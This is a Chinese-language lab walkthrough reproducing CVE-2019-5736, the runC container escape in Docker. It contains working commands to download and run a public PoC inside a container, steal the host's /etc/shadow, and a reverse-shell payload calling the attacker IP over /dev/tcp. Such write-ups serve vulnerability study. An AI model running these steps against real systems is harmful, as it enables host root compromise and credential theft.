一、漏洞简介

2019年2月11日，runC的维护团队报告了一个新发现的漏洞，SUSE Linux GmbH高级软件工程师Aleksa Sarai公布了影响Docker, containerd, Podman, CRI-O等默认运行时容器runc的严重漏洞CVE-2019-5736。
漏洞会对IT运行环境带来威胁，漏洞利用会触发容器逃逸、影响整个容器主机的安全，最终导致运行在该主机上的其他容器被入侵。漏洞影响AWS, Google Cloud等主流云平台。攻击者可以通过特定的容器镜像或者exec操作可以获取到宿主机的runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。
漏洞点在于runc。runc是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runc主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runc来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc二进制文件，攻击者可以在宿主机上以root身份执行命令。

 
受影响的软件版本：
docker version <=18.09.2
runc version <=1.0-rc6

（一）安装CentOS 7虚拟机作为目标宿主机

过程略。
宿主机IP：192.168.242.145
攻击者IP：192.168.242.1
 

（二）CentOS 7虚拟机中安装docker

简单起见，使用安装脚本自动安装含有漏洞的docker环境。

exit  //退出容器

//查看宿主机中docker和runc的版本


//启动服务

//设置服务自启动

（三）漏洞复现

1、生成payload

攻击者将PoC下载到本地：https://github.com/Frichetten/CVE-2019-5736-PoC
按照main.go代码的原意，利用runc的漏洞，在容器中执行后会将宿主机的/etc/shadow文件复制到宿主机的/tmp目录下。
将main.go编译成可执行文件
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
生成可执行文件，名为main
 

2、CentOS 7虚拟机中创建容器

docker run -it --rm --name runc ubuntu:18.04 /bin/bash
 

3、执行PoC

//攻击者在本地搭建http server
python -m SimpleHTTPServer
//同时攻击者在本地netcat监听连接
nc -l -p 1234
 
//攻击者在容器中执行下面的指令：
apt update
apt install wget
wget http://192.168.242.1:8000/main  //将PoC从攻击者机器下载到容器中
chmod +x main
./main  //执行PoC程序


开始监听docker exec命令的执行。
 
//如果此时容器管理员进入该容器，则触发PoC中的代码，生成/tmp/shadow文件
docker exec -it runc /bin/sh


容器中执行的命令使宿主机创建了文件，说明已经从容器逃逸到了宿主机中。
 

4、修改PoC使攻击者得到反弹shell

将PoC中的payload修改为反弹指令，则攻击者可以获得反弹shell。

var payload = "#!/bin/bash \n bash -i >& /dev/tcp/192.168.242.1/1234 0>&1"

生成可执行文件，名为main1。
